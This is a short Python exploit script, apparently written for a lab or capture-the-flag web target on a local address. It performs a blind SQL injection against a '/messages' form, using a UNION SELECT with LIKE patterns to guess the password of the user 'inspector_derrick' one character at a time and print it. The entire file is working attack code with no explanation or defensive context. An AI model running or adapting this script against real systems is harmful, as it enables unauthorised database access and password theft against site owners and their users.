import requests
import sys
import re
import string
from bs4 import BeautifulSoup

# Address selection
addr = "172.17.0.2" if len(sys.argv) > 1 else "127.0.01"

# SQL injection code
q = "blabla' UNION SELECT name, password FROM users WHERE name LIKE 'inspector_derrick' AND password LIKE '"

# URL
url = "http://" + addr + "/messages"

psw = ""
found = False

# Iterate over all the possible characters and check if it is correct 
while not found:
    for i in string.ascii_letters + string.digits:
        query = q + psw + i + "%"
        # Doing the request
        r = requests.post(url, data={"name": query})
        soup = BeautifulSoup(r.content, 'html.parser')
        # Find if this was successfull
        l = soup.findAll("div", {"class": "alert alert-success"})
        if l != []:
            psw = psw + i
            break
        if i == string.digits[-1] and l == []:
            found = True

# Print password
print(psw)

